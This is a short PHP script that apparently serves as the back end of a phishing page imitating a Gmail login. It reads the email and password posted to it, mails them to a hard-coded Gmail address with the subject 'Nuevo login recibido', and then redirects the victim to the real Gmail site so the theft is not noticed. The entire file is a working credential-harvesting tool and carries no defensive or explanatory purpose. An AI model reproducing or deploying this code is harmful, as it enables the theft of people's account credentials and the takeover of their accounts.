<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = htmlspecialchars($_POST['correo']);
    $contrasena = htmlspecialchars($_POST['contrasena']);

    $to = "castelnuovoerick@gmail.com";
    $subject = "Nuevo login recibido";
    $message = "Correo: $correo\nContraseña: $contrasena";
    $headers = "From: notificaciones@tuservidor.com";

    // Enviar el correo
    mail($to, $subject, $message, $headers);

    // Redirigir a Gmail (esto debe ir antes de cualquier salida de texto)
    header("Location: https://mail.google.com/");
    exit;
} else {
    echo "Acceso no permitido.";
}
?>
